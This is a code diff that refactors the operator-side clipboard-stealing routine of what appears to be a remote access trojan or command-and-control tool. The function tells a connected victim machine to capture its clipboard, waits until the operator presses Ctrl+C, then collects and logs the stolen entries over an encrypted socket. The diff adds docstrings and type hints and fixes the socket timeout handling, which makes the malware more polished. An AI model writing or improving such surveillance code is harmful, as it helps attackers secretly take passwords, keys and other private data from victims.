@@ -1,3 +1,5 @@
+"""Utility functions for capturing clipboard data from the client."""
+
 from components.networking import (
     decrypt_message,
     encrypt_message,
@@ -8,28 +10,48 @@ from termcolor import colored
 import socket
 import time
 
-def clipboard_steal_command(client_output, conn_obj):
+def clipboard_steal_command(client_output: bytes, conn_obj: socket.socket) -> str:
+    """Handle the clipboard stealing routine.
+
+    Parameters
+    ----------
+    client_output: bytes
+        Initial message from the client signalling the clipboard listener
+        has started on their side.
+    conn_obj: socket.socket
+        Active socket connection with the client.
+
+    Returns
+    -------
+    str
+        Aggregated clipboard data or an error message.
+    """
+
     received_data = []
 
     decrypted_client_message = decrypt_message(client_output)  # Signal message
     if decrypted_client_message.decode() != "STARTED":
         return colored("[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.", "red")
 
-    conn_obj.settimeout(0.5)  # Set to 0.5 seconds or any appropriate low value
-    print(f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
+    original_timeout = conn_obj.gettimeout()
+    # Use a short timeout while waiting for clipboard data
+    conn_obj.settimeout(0.5)
+    print(
+        f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
+    )
     
-    while True:
-        try:
+    try:
+        # Wait until the operator interrupts the loop with CTRL+C
+        while True:
             input("Press Ctrl+C to stop and receive clipboard data: ")
-        except KeyboardInterrupt:
-            conn_obj.sendall(encrypt_message("END"))
-            print(f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
-            print() # Clear above clutter
-            
-            break
-        print("Invalid data, only press 'Ctrl+C' to stop")
+    except KeyboardInterrupt:
+        conn_obj.sendall(encrypt_message("END"))
+        print(
+            f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}"
+        )
+        print()  # Clear any input clutter
 
-    # Attempt to receive leftover data AFTER interrupt
+    # Attempt to receive any buffered clipboard entries after the interrupt
     try:
         while True:
             try:
@@ -59,9 +81,11 @@ def clipboard_steal_command(client_output, conn_obj):
                 if data:
                     result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))
 
-            conn_obj.settimeout(10)  # Reset to original timeout
+            # Report gathered entries
             log_activity(f"Gathered {len(result)} clipboard entries.", "info")
             
             return "\n".join(result) 
     finally:
-        clear_socket_buffer(conn_obj)  # Clear the buffer to prevent leakage
+        # Ensure socket state is restored for subsequent commands
+        conn_obj.settimeout(original_timeout)
+        clear_socket_buffer(conn_obj)
